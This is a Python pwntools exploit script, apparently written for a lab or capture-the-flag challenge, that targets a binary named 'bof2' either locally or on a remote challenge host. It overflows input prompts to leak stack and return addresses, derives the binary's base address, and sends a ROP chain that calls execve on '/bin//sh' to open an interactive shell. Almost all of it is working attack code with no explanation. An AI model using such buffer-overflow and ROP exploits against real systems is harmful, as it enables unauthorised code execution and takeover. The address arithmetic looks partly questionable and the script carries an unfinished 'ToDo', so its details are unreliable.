#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof2'
port = 10259

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

leak_message = b'A' * 41
r.recvuntil(b'What\'s your name? ')
r.send(leak_message)
r.recvuntil(leak_message)
origin_data = r.recvuntil(b'\n').rstrip(b'\n')
rpp = int.from_bytes(origin_data, byteorder='little')
rpp = rpp >> 56
rpp = rpp + 0x48
print(f"rpp: {hex(rpp)}")
rzz = rpp + 8
print(f"rzz: {hex(rzz)}")
leak_message = b'A' * 40
origin_data = b'\x00' + origin_data
origin_data = leak_message + origin_data
origin_data = origin_data + b'\x00' * 2
leak_message = b'A' * 56
r.recvuntil(b'What\'s the room number? ')
r.send(leak_message)
r.recvuntil(leak_message)
ret_addr = r.recvuntil(b'\n').rstrip(b'\n')
ret_addr = int.from_bytes(ret_addr, byteorder='little')
main_addr = ret_addr - 0xa0
base  = main_addr - off_main
print(f"base: {hex(base)}")
print(f"ret_addr: {hex(ret_addr)}")

pop_rdx_rbx_ret = base + 0x000000000008dd8b
pop_rax_ret = base + 0x0000000000057187
pop_rdi_ret = base + 0x000000000000917f
pop_rsi_ret = base + 0x00000000000111ee
callsyscall = base + 0x0000000000008f34
print(f"pop_rdx_rbx_ret: {hex(pop_rdx_rbx_ret)}")
print(f"pop_rax_ret: {hex(pop_rax_ret)}")
print(f"pop_rdi_ret: {hex(pop_rdi_ret)}")
print(f"pop_rsi_ret: {hex(pop_rsi_ret)}")
print(f"callsyscall: {hex(callsyscall)}")

rop_chain = origin_data
rop_chain = rop_chain + p64(pop_rdx_rbx_ret)
rop_chain = rop_chain + p64(rzz)
rop_chain = rop_chain + p64(0)
rop_chain = rop_chain + p64(pop_rax_ret)
rop_chain = rop_chain + p64(59)
rop_chain = rop_chain + p64(pop_rdi_ret)
rop_chain = rop_chain + p64(rpp)
rop_chain = rop_chain + p64(pop_rsi_ret)
rop_chain = rop_chain + p64(rpp)
rop_chain = rop_chain + p64(callsyscall)
rop_chain = rop_chain + b'/bin//sh\x00'
rop_chain = rop_chain + p64(0)

r.recvuntil(b'What\'s the customer\'s name? ')
r.send(rop_chain)
# ToDo
input()

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
